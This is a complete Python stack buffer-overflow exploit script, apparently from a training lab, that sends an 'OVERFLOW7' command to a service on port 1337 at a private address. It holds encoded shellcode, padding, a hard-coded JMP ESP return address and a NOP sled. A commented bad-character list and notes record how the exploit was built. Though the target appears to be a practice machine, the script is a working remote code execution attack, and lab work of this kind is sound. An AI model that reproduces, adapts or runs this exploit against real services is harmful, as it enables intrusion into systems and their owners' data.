#!/usr/bin/python3
import sys, socket

overflow = ("\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xb0\x66\x46\x2d\x83\xee\xfc\xe2\xf4\x4c\x8e\xc4\x2d\xb0\x66"
"\x26\xa4\x55\x57\x86\x49\x3b\x36\x76\xa6\xe2\x6a\xcd\x7f\xa4"
"\xed\x34\x05\xbf\xd1\x0c\x0b\x81\x99\xea\x11\xd1\x1a\x44\x01"
"\x90\xa7\x89\x20\xb1\xa1\xa4\xdf\xe2\x31\xcd\x7f\xa0\xed\x0c"
"\x11\x3b\x2a\x57\x55\x53\x2e\x47\xfc\xe1\xed\x1f\x0d\xb1\xb5"
"\xcd\x64\xa8\x85\x7c\x64\x3b\x52\xcd\x2c\x66\x57\xb9\x81\x71"
"\xa9\x4b\x2c\x77\x5e\xa6\x58\x46\x65\x3b\xd5\x8b\x1b\x62\x58"
"\x54\x3e\xcd\x75\x94\x67\x95\x4b\x3b\x6a\x0d\xa6\xe8\x7a\x47"
"\xfe\x3b\x62\xcd\x2c\x60\xef\x02\x09\x94\x3d\x1d\x4c\xe9\x3c"
"\x17\xd2\x50\x39\x19\x77\x3b\x74\xad\xa0\xed\x0e\x75\x1f\xb0"
"\x66\x2e\x5a\xc3\x54\x19\x79\xd8\x2a\x31\x0b\xb7\x99\x93\x95"
"\x20\x67\x46\x2d\x99\xa2\x12\x7d\xd8\x4f\xc6\x46\xb0\x99\x93"
"\x7d\xe0\x36\x16\x6d\xe0\x26\x16\x45\x5a\x69\x99\xcd\x4f\xb3"
"\xd1\x47\xb5\x0e\x4c\x26\x98\x90\x2e\x2f\xb0\x77\x1a\xa4\x56"
"\x0c\x56\x7b\xe7\x0e\xdf\x88\xc4\x07\xb9\xf8\x35\xa6\x32\x21"
"\x4f\x28\x4e\x58\x5c\x0e\xb6\x98\x12\x30\xb9\xf8\xd8\x05\x2b"
"\x49\xb0\xef\xa5\x7a\xe7\x31\x77\xdb\xda\x74\x1f\x7b\x52\x9b"
"\x20\xea\xf4\x42\x7a\x2c\xb1\xeb\x02\x09\xa0\xa0\x46\x69\xe4"
"\x36\x10\x7b\xe6\x20\x10\x63\xe6\x30\x15\x7b\xd8\x1f\x8a\x12"
"\x36\x99\x93\xa4\x50\x28\x10\x6b\x4f\x56\x2e\x25\x37\x7b\x26"
"\xd2\x65\xdd\xa6\x30\x9a\x6c\x2e\x8b\x25\xdb\xdb\xd2\x65\x5a"
"\x40\x51\xba\xe6\xbd\xcd\xc5\x63\xfd\x6a\xa3\x14\x29\x47\xb0"
"\x35\xb9\xf8")


shellcode = "A" * 1306 + "\xaf\x11\x50\x62" + "\x90" * 16 + overflow

# badchars = (
#   "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
#   "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
#   "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
#   "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
#   "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
#   "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
#   "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
#   "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
#   "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8d\x8e\x8f\x90"
#   "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
#   "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xaf\xb0"
#   "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbf\xc0"
#   "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
#   "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
#   "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
#   "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfc\xfd\xfe\xff"
# )
# # 00 8c ae be fb --> 625011AF

# shellcode = "A" * 1306 + "B" * 4 + badchars

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('10.10.83.121',1337))

    payload = "OVERFLOW7 " + shellcode
    print("Sending evil buffer...")
    s.send(bytes(payload + "\r\n","latin-1"))
    s.close()
    print("Done!")
    
except:
    print ("Error connecting to server")
    sys.exit()                                 